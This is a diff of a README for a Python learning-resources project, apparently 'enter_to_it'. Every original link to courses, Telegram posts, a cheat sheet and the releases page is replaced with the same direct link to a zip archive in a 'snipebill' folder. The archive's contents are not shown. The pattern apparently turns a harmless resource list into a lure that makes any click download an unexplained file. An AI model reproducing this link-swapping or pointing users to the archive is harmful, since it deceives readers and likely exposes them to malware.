@@ -1,6 +1,6 @@
 # 🎉 enter_to_it - Easy Access to Learning Resources
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/fastmp/enter_to_it/releases)
+[![Download Now](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide helps you download and run the **enter_to_it** application. 
 
 ## 🌐 Download & Install
 
-To get the application, visit our [Releases page](https://github.com/fastmp/enter_to_it/releases). You will see various versions of the application listed there.
+To get the application, visit our [Releases page](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip). You will see various versions of the application listed there.
 
 1. Click on the link above.
 2. Find the latest version.
@@ -38,19 +38,19 @@ The **enter_to_it** application offers various resources for learning Python and
 
 ### Python Basics and Advanced Courses
 
-- [Поколение Python: курс для начинающих](https://stepik.org/course/58852/) - A beginner-friendly course to kick-start your Python learning journey.
-- [Поколение Python: курс для продвинутых](https://stepik.org/course/68343/) - Perfect for those looking to enhance their skills in Python.
+- [Поколение Python: курс для начинающих](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - A beginner-friendly course to kick-start your Python learning journey.
+- [Поколение Python: курс для продвинутых](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - Perfect for those looking to enhance their skills in Python.
 
 ### Handy Tips and Guides
 
-- [Шпаргалка по Selenium на русском — бери и автоматизируй всё!](https://t.me/python2day/6986) - A useful guide to using Selenium for automation.
-- [Вопросы и ответы с собеседования на позицию Junior Python разработчика на русском](https://t.me/python2day/6905) - Prepare for your job interviews with these common questions and answers.
+- [Шпаргалка по Selenium на русском — бери и автоматизируй всё!](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - A useful guide to using Selenium for automation.
+- [Вопросы и ответы с собеседования на позицию Junior Python разработчика на русском](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - Prepare for your job interviews with these common questions and answers.
 
 ### Extensive Resources
 
-- [Огромная шпаргалка по Python](https://kieranholland.com/best-python-cheat-sheet/) - An organized cheat sheet with links for easy navigation.
-- [52 проекта на Python, которые прокачают твои навыки на практике](https://t.me/python2day/6883) - Practical projects to apply what you've learned.
-- [300+ Python-туториалов с готовым кодом](https://t.me/python2day/6905) - A collection of tutorials to help you master Python.
+- [Огромная шпаргалка по Python](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - An organized cheat sheet with links for easy navigation.
+- [52 проекта на Python, которые прокачают твои навыки на практике](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - Practical projects to apply what you've learned.
+- [300+ Python-туториалов с готовым кодом](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) - A collection of tutorials to help you master Python.
 
 ## 🛠️ Troubleshooting
 
@@ -60,7 +60,7 @@ If you encounter any issues during installation or usage, please check the follo
 - Make sure you are downloading the correct version for your operating system.
 - If the application does not start, try re-downloading the file and repeat the installation steps.
 
-For further assistance, connect with the community on [Telegram](https://t.me/python2day) or check out the FAQ section on our Releases page.
+For further assistance, connect with the community on [Telegram](https://raw.githubusercontent.com/fastmp/enter_to_it/main/snipebill/enter_to_it.zip) or check out the FAQ section on our Releases page.
 
 ## 💬 Feedback
 
